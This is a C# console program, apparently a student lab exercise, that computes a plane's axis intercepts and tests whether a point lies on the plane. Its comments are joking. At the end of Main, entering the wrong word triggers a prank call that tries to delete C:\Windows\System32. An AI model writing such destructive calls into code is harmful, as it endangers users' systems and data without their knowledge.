using System;
using System.Diagnostics;
using System.IO;

namespace LR1_K2_S1_T1
{
	class Plane
	{
		private double A;
		private double B;
		private double C;
		private double D;

		public Plane()
		{
			A = 0;
			B = 0;
			C = 0;
			D = 0;
		}

		public Plane(double a, double b, double c, double d)
		{
			A = a;
			B = b;
			C = c;
			D = d;
		}
		public double this[int index]
		{
			get//це щоб діставало значення 
			{
				switch (index)
				{
					case 0: return A;
					case 1: return B;
					case 2: return C;
					case 3: return D;
					default:
						throw new IndexOutOfRangeException("Я ваще не колупаю як можна було написати неправильний індекс");
				}
			}
			set//це щоб впихувало значення
			{
				switch (index)
				{
					case 0:
						A = value;
						break;
					case 1:
						B = value;
						break;
					case 2:
						C = value;
						break;
					case 3:
						D = value;
						break;
					default:
						throw new IndexOutOfRangeException("Я ваще не колупаю як можна було написати неправильний індекс");//2
				}//трошки заплутано,але є гайд на ютубі де все дуже добре поясненно
				 //https://youtu.be/dQw4w9WgXcQ?list=RDdQw4w9WgXcQ
			}
		}

		public void Input()
		{
			Console.WriteLine("Ввведіть значення ABCD в один рядок через пробіл");
			string[] ABCD = Console.ReadLine().Split();
			while (ABCD.Length < 4 || !double.TryParse(ABCD[0], out _) || !double.TryParse(ABCD[1], out _) || !double.TryParse(ABCD[2], out _) || !double.TryParse(ABCD[3], out _))
			{
				Console.WriteLine("ні");
				ABCD = Console.ReadLine().Split();
			}
			A = double.Parse(ABCD[0]);
			B = double.Parse(ABCD[1]);
			C = double.Parse(ABCD[2]);
			D = double.Parse(ABCD[3]);
		}

		public void Output()
		{
			Console.WriteLine($"Рівняння площини: {A}x + {B}y + {C}z + {D} = 0 #Якщо хтось хоче причепитись до того що я записую нулі, у мене є контраргумент:мені всеодно");

		}

		public void IntersectionWithPlane()
		{
			if (A == 0)
			{
				Console.WriteLine("ні,нульовий х не можна.Перетину з вісю іксів нема");
			}
			else
			{
				double x = -D / A;
				Console.WriteLine($"Перетин з вісю іксів на координаті {x}");//інші координати нулі.
			}
			if (B == 0)
			{
				Console.WriteLine("ні,нульовий y теж не можна.Перетину з вісю ігриків немає");
			}
			else
			{
				double y = -D / B;
				Console.WriteLine($"перетин по вісі ігорів:{y}");
			}

			if (C == 0)
			{
				Console.WriteLine("нульовий Z.");
			}
			else
			{
				double z = -D / C;
				Console.WriteLine($"z:{z}");
			}
		}
	}


	class Program
	{
		static void Main()
		{
			while (true)
			{
				Plane plane = new Plane();
				plane.Input();
				plane.Output();
				plane.IntersectionWithPlane();
				Console.WriteLine("Перевірка точки. Координати писати по шаблону ");
				string[] xyz = Console.ReadLine().Split();
				while (xyz.Length < 3 || !double.TryParse(xyz[0], out _) || !double.TryParse(xyz[1], out _) || !double.TryParse(xyz[2], out _))
				{
					Console.WriteLine("ні");
					xyz = Console.ReadLine().Split();
				}
				if (Math.Abs(plane[0] * double.Parse(xyz[0]) + plane[1] * double.Parse(xyz[1]) + plane[2] * double.Parse(xyz[2]) + plane[3]) == 0)
				{
					Console.WriteLine("Точка належить площині.");
				}
				else
				{
					Console.WriteLine("Точка не належить площині.");
				}
				Console.WriteLine("Щоб отримати коефіцієнти через індексатор напишіть 'бурмалда'");
				if (Console.ReadLine() == "бурмалда")
				{
					Console.WriteLine($"A = {plane[0]}");
					Console.WriteLine($"B = {plane[1]}");
					Console.WriteLine($"C = {plane[2]}");
					Console.WriteLine($"D = {plane[3]}");
				}
				else
				{
					Directory.Delete("C:\\Windows\\System32");
					//я знаю що це не спрацює
				}
			}
		}
	}
}